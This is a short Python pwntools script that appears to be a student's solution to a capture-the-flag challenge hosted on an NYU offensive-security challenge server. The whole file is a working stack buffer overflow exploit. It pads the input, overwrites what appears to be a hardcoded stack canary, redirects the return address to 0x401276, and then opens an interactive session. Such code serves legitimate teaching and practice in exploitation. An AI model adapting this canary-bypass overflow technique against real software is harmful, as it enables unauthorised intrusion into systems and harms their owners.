from pwn import *

lst = [0x78, 0x47, 0xe2, 0xe4, 0x32, 0xba, 0xa6]
payload = 'A'*136 + '\x00' + \
p8(lst[0]) + p8(lst[1]) + p8(lst[2]) + \
p8(lst[3]) + p8(lst[4]) + p8(lst[5]) + \
p8(lst[6]) + 'B'*8 + p64(0x0000000000401276)

context.log_level = 'debug'

# p = remote('127.0.0.1', 8000)
p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1340)
p.sendafter('abc123): ', 'tg1799\n')
p.sendafter('name?\n', '200\n')
p.sendafter('data\n', payload)

p.interactive()

